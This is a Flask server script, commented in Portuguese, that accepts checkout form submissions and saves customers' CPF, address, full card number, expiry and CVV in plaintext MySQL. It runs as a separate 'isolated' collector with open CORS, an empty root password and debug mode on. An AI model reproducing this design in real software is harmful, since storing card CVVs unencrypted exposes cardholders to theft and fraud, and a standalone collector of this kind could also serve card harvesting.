import pymysql
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS

app = Flask(__name__)
CORS(app) 

# ===== CONFIGURAÇÃO XAMPP =====
USUARIO = 'root'
SENHA   = '' 
HOST    = 'localhost'
BANCO   = 'db_sistema_isolado'

# 1. FUNÇÃO PARA CRIAR O BANCO DE DADOS NO MYSQL (XAMPP) CASO NÃO EXISTA
def inicializar_banco_fisico():
    try:
        conexao = pymysql.connect(host=HOST, user=USUARIO, password=SENHA)
        cursor = conexao.cursor()
        cursor.execute(f"CREATE DATABASE IF NOT EXISTS {BANCO}")
        conexao.commit()
        cursor.close()
        conexao.close()
        print(f"✅ Verificação do banco '{BANCO}' concluída.")
    except Exception as e:
        print(f"❌ Erro ao criar banco no MySQL: {e}")

# Executa a criação antes de configurar o SQLAlchemy
inicializar_banco_fisico()

# Configuração da conexão
app.config['SQLALCHEMY_DATABASE_URI'] = f'mysql+pymysql://{USUARIO}:{SENHA}@{HOST}/{BANCO}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ===== MODELO DE DADOS (Tabela atualizada com campos de pagamento) =====
class Cadastro(db.Model):
    __tablename__ = 'pedidos' # Alterado para bater com sua intenção de rota
    id = db.Column(db.Integer, primary_key=True)
    nome = db.Column(db.String(100))
    cpf = db.Column(db.String(20))
    email = db.Column(db.String(100))
    telefone = db.Column(db.String(20))
    cep = db.Column(db.String(10))
    logradouro = db.Column(db.String(100))
    numero = db.Column(db.String(10))
    complemento = db.Column(db.String(50), nullable=True)
    bairro = db.Column(db.String(50))
    cidade = db.Column(db.String(50))
    uf = db.Column(db.String(2))
    # Novos campos para suportar os dados do cartão
    cardNumber = db.Column(db.String(20), nullable=True)
    cardName = db.Column(db.String(100), nullable=True)
    cardExpiry = db.Column(db.String(10), nullable=True)
    cardCVV = db.Column(db.String(10), nullable=True)

# Cria as tabelas automaticamente
with app.app_context():
    try:
        db.create_all()
        print("✅ Tabelas verificadas/criadas com sucesso!")
    except Exception as e:
        print(f"❌ Erro ao sincronizar tabelas: {e}")

# ===== ROTA DE SALVAMENTO (Padrão SQLAlchemy) =====
@app.route('/finalizar-compra', methods=['POST'])
def finalizar_compra():
    dados = request.json
    if not dados:
        return jsonify({"status": "erro", "mensagem": "Dados não recebidos"}), 400
        
    try:
        # Criando o objeto com os dados recebidos do formulário
        novo_pedido = Cadastro(
            nome=dados.get("nome"),
            cpf=dados.get("cpf"),
            email=dados.get("email"),
            telefone=dados.get("telefone"),
            cep=dados.get("cep"),
            logradouro=dados.get("logradouro"),
            numero=dados.get("numero"),
            complemento=dados.get("complemento"),
            bairro=dados.get("bairro"),
            cidade=dados.get("cidade"),
            uf=dados.get("uf"),
            cardNumber=dados.get("cardNumber"),
            cardName=dados.get("cardName"),
            cardExpiry=dados.get("cardExpiry"),
            cardCVV=dados.get("cardCVV")
        )

        db.session.add(novo_pedido)
        db.session.commit()
        
        return jsonify({
            "status": "sucesso", 
            "mensagem": "Dados salvos no servidor de dados isolado!"
        }), 201

    except Exception as e:
        db.session.rollback()
        print(f"Erro ao salvar: {e}")
        return jsonify({"status": "erro", "mensagem": str(e)}), 500
    
@app.route('/')
def home():
    return "<h1>Servidor de Dados Isolado Online!</h1><p>Aguardando envios do formulário...</p>"

if __name__ == '__main__':
    # Rodando na porta 5001 para não conflitar com o servidor principal
    app.run(debug=True, port=5001)